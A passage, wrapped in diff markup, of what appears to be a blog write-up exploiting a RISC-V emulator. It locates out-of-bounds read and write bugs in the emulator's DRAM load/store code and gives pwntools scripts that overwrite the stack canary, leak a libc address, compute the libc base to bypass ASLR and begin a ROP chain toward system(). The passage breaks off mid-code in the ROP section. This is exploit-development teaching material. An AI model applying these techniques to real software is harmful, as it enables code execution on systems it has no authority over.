+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="nf">bus_load</span><span class="p">(</span><span class="n">BUS</span><span class="o">*</span> <span class="n">bus</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">size</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">dram_load</span><span class="p">(</span><span class="o">&amp;</span><span class="p">(</span><span class="n">bus</span><span class="o">-&gt;</span><span class="n">dram</span><span class="p">),</span> <span class="n">addr</span><span class="p">,</span> <span class="n">size</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">//dram load (vulnerable code) 
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="kt">uint64_t</span> <span class="nf">dram_load_8</span><span class="p">(</span><span class="n">DRAM</span><span class="o">*</span> <span class="n">dram</span><span class="p">,</span> <span class="kt">uint64_t</span> <span class="n">addr</span><span class="p">){</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="p">(</span><span class="kt">uint64_t</span><span class="p">)</span> <span class="n">dram</span><span class="o">-&gt;</span><span class="n">mem</span><span class="p">[</span><span class="n">addr</span> <span class="o">-</span> <span class="n">DRAM_BASE</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>From the <em>dram_load_n</em> source code snippet above, there is clearly an <strong>OOB</strong> Read vulnerability. This is because an attacker can read beyond the array buffer since there are no bounds checks to check if addr exceeds its limits; moreover the attacker has control over this value. This array is intialized with the <em>DRAM_SIZE</em> value as shown from the following source code snippet.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-c" data-lang="c"><span class="line"><span class="cl"><span class="cp">#define DRAM_SIZE 1024*1024*1
+</span></span></span><span class="line"><span class="cl"><span class="cp">#define DRAM_BASE 0x80000000
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">typedef</span> <span class="k">struct</span> <span class="n">DRAM</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">	<span class="kt">uint8_t</span> <span class="n">mem</span><span class="p">[</span><span class="n">DRAM_SIZE</span><span class="p">];</span>     <span class="c1">// Dram memory of DRAM_SIZE
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="p">}</span> <span class="n">DRAM</span><span class="p">;</span>
+</span></span></code></pre></div><p>The maximum size of the array is <code>0x100000</code>, therefore if we pass a value for example <code>0x80100010</code> as the <em>addr</em>, the size passed to the array will be <code>0x100010</code> and therefore we will be reading <code>0x10</code> bytes outside leading to a <em><strong>OOBR</strong></em> bug.</p>
+<p>The same applies to the <em>store</em> set of instruction(s) that do not perform any <strong>bounds</strong> check therefore introducing an <em><strong>OOBW</strong></em> bug.</p>
+<div id="exploitation-strategy" class="anchor"></div>
+<h3 class="relative group">Exploitation Strategy 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#exploitation-strategy" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>Before weaponizing our exploit, we need to understand how the VM works. From its source code <code>main.c</code>, the application requires a file passed as its command line argument in this case a <em>bin</em> file. The size of the file is then determined and the contents of the file are copied to memory. Using a loop, based on specified instructions read from the file, the <code>cpu_execute</code> will implement these as <strong>RISC-V</strong> instructions.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="n">argc</span> <span class="o">!=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">printf</span><span class="p">(</span><span class="s">&#34;Usage: rvemu &lt;filename&gt;</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// Initialize cpu, registers and program counter
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">struct</span> <span class="n">CPU</span> <span class="n">cpu</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cpu_init</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="c1">// Read input file
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="n">read_file</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="c1">// cpu loop
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// fetch
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="kt">uint32_t</span> <span class="n">inst</span> <span class="o">=</span> <span class="n">cpu_fetch</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// Increment the program counter
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="n">cpu</span><span class="p">.</span><span class="n">pc</span> <span class="o">+=</span> <span class="mi">4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="c1">// execute
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="n">cpu_execute</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="n">dump_registers</span><span class="p">(</span><span class="o">&amp;</span><span class="n">cpu</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">        <span class="k">if</span><span class="p">(</span><span class="n">cpu</span><span class="p">.</span><span class="n">pc</span><span class="o">==</span><span class="mi">0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">            <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span></code></pre></div><p>The <code>cpu_execute</code> implementation from the <code>src/cpu.c</code> is a follows:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">cpu_execute</span><span class="p">(</span><span class="n">CPU</span> <span class="o">*</span><span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">int</span> <span class="n">opcode</span> <span class="o">=</span> <span class="n">inst</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">;</span>           <span class="c1">// opcode in bits 6..0
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">funct3</span> <span class="o">=</span> <span class="p">(</span><span class="n">inst</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">;</span>    <span class="c1">// funct3 in bits 14..12
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="kt">int</span> <span class="n">funct7</span> <span class="o">=</span> <span class="p">(</span><span class="n">inst</span> <span class="o">&gt;&gt;</span> <span class="mi">25</span><span class="p">)</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">;</span>   <span class="c1">// funct7 in bits 31..25
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>                   <span class="c1">// x0 hardwired to 0 at each cycle
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="cm">/*printf(&#34;%s\n%#.8lx -&gt; Inst: %#.8x &lt;OpCode: %#.2x, funct3:%#x, funct7:%#x&gt; %s&#34;,*/</span>
+</span></span><span class="line"><span class="cl">            <span class="cm">/*ANSI_YELLOW, cpu-&gt;pc-4, inst, opcode, funct3, funct7, ANSI_RESET); // DEBUG*/</span>
+</span></span><span class="line"><span class="cl">    <span class="n">printf</span><span class="p">(</span><span class="s">&#34;%s</span><span class="se">\n</span><span class="s">%#.8lx -&gt; %s&#34;</span><span class="p">,</span> <span class="n">ANSI_YELLOW</span><span class="p">,</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">pc</span><span class="o">-</span><span class="mi">4</span><span class="p">,</span> <span class="n">ANSI_RESET</span><span class="p">);</span> <span class="c1">// DEBUG
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">    <span class="k">switch</span> <span class="p">(</span><span class="n">opcode</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">LUI</span><span class="p">:</span>   <span class="n">exec_LUI</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">        <span class="k">case</span> <span class="nl">AUIPC</span><span class="p">:</span> <span class="n">exec_AUIPC</span><span class="p">(</span><span class="n">cpu</span><span class="p">,</span> <span class="n">inst</span><span class="p">);</span> <span class="k">break</span><span class="p">;</span>
+</span></span></code></pre></div><p>What this does is that is basically does some logical operations on the instructions written to the file to determine the <code>opcode</code>, <code>func3</code>, <code>funct7</code>, <code>rd</code>, <code>rs1</code>, <code>rs2</code> and the <code>imm</code> values. Based on the opcode, certain instructions are emulated.</p>
+<p>Using a simple python script, we will write these instructions into a <code>bin</code> file, to basically implement an <strong>exec_ADDI</strong> instruction for POC. This should basically <em>ADD</em> two values and store the result to a register.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-C" data-lang="C"><span class="line"><span class="cl"><span class="kt">void</span> <span class="nf">exec_ADDI</span><span class="p">(</span><span class="n">CPU</span><span class="o">*</span> <span class="n">cpu</span><span class="p">,</span> <span class="kt">uint32_t</span> <span class="n">inst</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">uint64_t</span> <span class="n">imm</span> <span class="o">=</span> <span class="n">imm_I</span><span class="p">(</span><span class="n">inst</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rd</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">=</span> <span class="n">cpu</span><span class="o">-&gt;</span><span class="n">regs</span><span class="p">[</span><span class="n">rs1</span><span class="p">(</span><span class="n">inst</span><span class="p">)]</span> <span class="o">+</span> <span class="p">(</span><span class="kt">int64_t</span><span class="p">)</span> <span class="n">imm</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">print_op</span><span class="p">(</span><span class="s">&#34;addi</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>From the <code>src/cpu.c</code>, this instruction is only implemented when the opcode is <strong>I_TYPE (0x13)</strong> and the value of <strong>funct3</strong> is <code>0x0</code> from <code>include/opcodes.h</code>. Using a simple python script as shown below, we will try to re-produce values that will implement this instruction.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">#opcodes</span>
+</span></span><span class="line"><span class="cl"><span class="n">I_TYPE</span> <span class="o">=</span> <span class="mh">0x13</span>
+</span></span><span class="line"><span class="cl"><span class="n">ADD</span> <span class="o">=</span> <span class="mh">0x0</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># Registers </span>
+</span></span><span class="line"><span class="cl"><span class="n">A0</span> <span class="o">=</span> <span class="mi">10</span>
+</span></span><span class="line"><span class="cl"><span class="n">SP</span> <span class="o">=</span> <span class="mh">0x2</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">init</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">funct7</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">=</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">opcode</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">funct3</span> <span class="o">&amp;</span> <span class="mh">0x7</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">funct7</span> <span class="o">&amp;</span> <span class="mh">0x7f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">25</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">rs1</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">15</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">rs2</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">rd</span> <span class="o">&amp;</span> <span class="mh">0x1f</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">7</span>
+</span></span><span class="line"><span class="cl">	
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">inst</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">exec_ADDI</span><span class="p">(</span><span class="n">opcode</span><span class="o">=</span><span class="n">I_TYPE</span><span class="p">,</span> <span class="n">funct3</span><span class="o">=</span><span class="n">ADD</span><span class="p">,</span> <span class="n">funct7</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rd</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="mi">0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">=</span> <span class="n">init</span><span class="p">(</span><span class="n">opcode</span><span class="p">,</span> <span class="n">funct3</span><span class="p">,</span> <span class="n">funct7</span><span class="p">,</span> <span class="n">rd</span><span class="p">,</span> <span class="n">rs1</span><span class="p">,</span> <span class="n">rs2</span><span class="p">)</span>	
+</span></span><span class="line"><span class="cl">	<span class="n">inst</span> <span class="o">|=</span> <span class="p">(</span><span class="n">imm</span> <span class="o">&amp;</span> <span class="mh">0xfff</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="mi">20</span>
+</span></span><span class="line"><span class="cl">	<span class="k">return</span> <span class="n">inst</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">	<span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">		<span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">2</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">	<span class="p">])</span>
+</span></span><span class="line"><span class="cl">	<span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;file.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span> <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">	<span class="n">main</span><span class="p">()</span>
+</span></span></code></pre></div><p>The above python script will write the instructions used to emulate an <em>exec_ADDI</em> RISC-V instruction into<code>file.bin</code>. When these instructions are executed, this will add the value in the SP register passed to <code>rs1</code> which was <code>0x80100000</code> with <code>2</code> and the result which is expected to be <code>0x80100002</code> will be stored in the <code>A0</code> register.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/yjWpLRl.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>Currently, we have not idea what is beyond the bounds of the array and where it is located. This can be a location on the <em>stack</em> that can allow us to control EIP or an mmaped location in libc that can allow us to overwrite a libc pointer e.g <em>__malloc_hook</em>. Using the <em>OOBW</em> vulnerability, we will write a value slight beyond the array and use the debugger to find this value in memory.</p>
+<p>Using the <em>exec_ADDI</em> instruction and an <em>exec_SLLI</em> to shift this value, we will store the value <em>0x42424242</em> into one of RISC-V&rsquo;s registers that will be followed by a store that will write this value beyond the array at <em>mem[sp+0x4]</em>. This can be done from the following python source code snippet.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+</span></span><span class="line"><span class="cl">        <span class="n">payload</span> <span class="o">=</span> <span class="n">flat</span><span class="p">([</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span><span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x424</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mi">12</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x242</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec_SLLI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x8</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x42</span><span class="p">),</span>
+</span></span><span class="line"><span class="cl">        <span class="n">exec_SD</span><span class="p">(</span><span class="n">rs1</span><span class="o">=</span><span class="n">SP</span><span class="p">,</span> <span class="n">rs2</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x4</span><span class="p">),</span> <span class="c1">#trigger OOBW</span>
+</span></span><span class="line"><span class="cl">        <span class="p">])</span>
+</span></span><span class="line"><span class="cl">        <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s2">&#34;file.bin&#34;</span><span class="p">,</span> <span class="s2">&#34;wb&#34;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fp</span><span class="p">:</span> <span class="n">fp</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+</span></span></code></pre></div><p>Notice that since the <code>SP</code> register already has the value <code>0x80100000</code>, passing <code>0x4</code> into <strong>imm</strong> will write the value from the <code>A0</code> register leading to a Out-Of-Bounds by 0x4 bytes.</p>
+<p>When I ran the executable and passed the <code>file.bin</code> file that was generated from the above python script, I received a <em>Stack Smashing Detected</em> error.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/FRVigQl.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>This was therefore an indicator that the <em><em>mem</em></em> array was indeed on the stack and since this was initialized in the <em>main()</em> function, it particulary might be overwriting the stack canary on <em>main&rsquo;s</em> stack. This can therefore be better visualized from the debugger. Load the emulaator into the debugger and set a break-point in the <em>main</em> function right before the <em>__stack_canary</em> check at <code>br *main + 218</code>.</p>
+<p>When the break-point it hit and the stack where the canary is placed at <code>rbp - 0x8</code> is examined, indeed the canary is overwritten with the lower 4 bytes from the arbitrary value we wrote earlier.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/SPJb5mR.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>The stack canary on the stack, is usually followed by <code>RBP</code> and finally the saved return, therefore by adjusting the value mem[sp+0x4], we can come to the following conclusion.</p>
+<ul>
+<li><strong>Stack Canary</strong> (mem[sp+0x8])</li>
+<li><strong>RBP</strong> (mem[sp+0x10])</li>
+<li><strong>Saved Return Address</strong> (mem[sp+0x18])</li>
+</ul>
+<div id="weaponization" class="anchor"></div>
+<h3 class="relative group">Weaponization 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#weaponization" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>We already know the location of the array in memory and its offset from the  <em>saved return address</em>. An <strong>OOBR</strong> will be used to leak a libc address from the stack and since we are in main&rsquo;s stack, its return address will most probaly be <code>__libc_start_main_ret</code>; with this address we can find the base address to libc and craft a ROP chain, to call system that will return a shell for code execution bypassing <em>ASLR</em>.</p>
+<blockquote>
+<p><strong>NOTE</strong>: <em>Since RISC-V uses a load and store architecture, these address will therefore need to be written to specific &lsquo;registers&rsquo; before being written into memory</em>.</p>
+</blockquote>
+<div id="leaking-addresses" class="anchor"></div>
+<h4 class="relative group">Leaking addresses 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#leaking-addresses" aria-label="Anchor">#</a></span>        
+    
+</h4>
+<p>On the stack, the return address of main (save RIP) is at <code>mem[sp+0x18]</code> as previously identified. The return address of main is usually a <strong>libc</strong> address at <em>__libc_start_main</em>. This address can therefore be &rsquo;leaked&rsquo; by writing it into one of the VM&rsquo;s registers.</p>
+<p>The following python code snippet is used to leak this address and loads it into the <code>A0</code> register.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">exec_LD</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="mi">2</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x18</span><span class="p">)</span>
+</span></span></code></pre></div><p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/BpIHQBF.png" alt="" />
+    
+  </figure>
+
+</p>
+<p>From the debugger, (in my current machine), this address is an address at <code>__libc_start_call_main+122</code>. The address of <code>__libc_start_main</code> from the leaked address is <code>leaked_address + 0x36</code>.</p>
+<p>Using the <em>exec_ADDI</em> instruction, we will add and subtract the above values and store the result in the same <code>A0</code> register. The reson why we do not use an exec_SUB instruction, is because this does not exist as an instruction in RISC-IV. More can be read <a href="https://itnext.io/risc-v-instruction-set-cheatsheet-70961b4bbe8"   target="_blank">
+    here</a></p>
+<p>The following python code snippet can be used for this action.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x36</span><span class="p">),</span>
+</span></span></code></pre></div><p>With the address of <code>__libc_start_main</code> leaked, we can now calculate the base address of libc, to be able to bypass ASLR. The <em>exec_ADDI</em> instruction, will then be used here again to subtract the value of <em>libc.sym[&quot;__libc_start_main&quot;]</em> that is at <code>0x271c0</code>.</p>
+<p>From the source code, we cannot subtract the whole value <code>0x271c0</code> since <em>exec_ADDI</em> can only support 12-bit signed numbers. We therefore need to find a way to only subtract the 12-bit signed numbers and this can be done via a loop..First we need to subract <code>0xc0</code> to remain with <code>0x27100</code>. A loop that loops <code>0x27100//0x100</code> times can therefore be used to subtract this value concurrently.</p>
+<p>The following python code snippet can be used for this action.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A0</span><span class="p">,</span> <span class="n">imm</span><span class="o">=-</span><span class="mh">0xc0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mh">0x27100</span><span class="o">//</span><span class="mh">0x100</span><span class="p">):</span> <span class="n">payload</span> <span class="o">+=</span> <span class="n">flat</span><span class="p">(</span><span class="n">exec_ADDI</span><span class="p">(</span><span class="n">rd</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">rs1</span><span class="o">=</span><span class="n">A1</span><span class="p">,</span> <span class="n">imm</span><span class="o">=</span><span class="mh">0x100</span><span class="p">))</span>
+</span></span></code></pre></div><p>As shown below the based address of libc is returned and stored in the <strong>A1</strong> register.</p>
+<p>
+
+
+
+
+  <figure>
+    <img class="my-0 rounded-md" src="https://i.imgur.com/PJbPG9S.png" alt="" />
+    
+  </figure>
+
+</p>
+<div id="rop-attack" class="anchor"></div>
+<h3 class="relative group">Rop Attack 
+    <span
+        class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100">
+        <a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700"
+            style="text-decoration-line: none !important;" href="#rop-attack" aria-label="Anchor">#</a></span>        
+    
+</h3>
+<p>With the base address of libc, a rop attack can be chained for code execution. From the current libc of my machine the address of <code>libc.sym['system']</code> was <code>0x4c330</code>. This address was written to a chosen register in this case the <code>A3</code> register using the following source code snippet.</p>
+<blockquote>
+<p>NOTE: Remember the 12-bit signed integer limit on <em>exec_ADDI</em>.</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl">
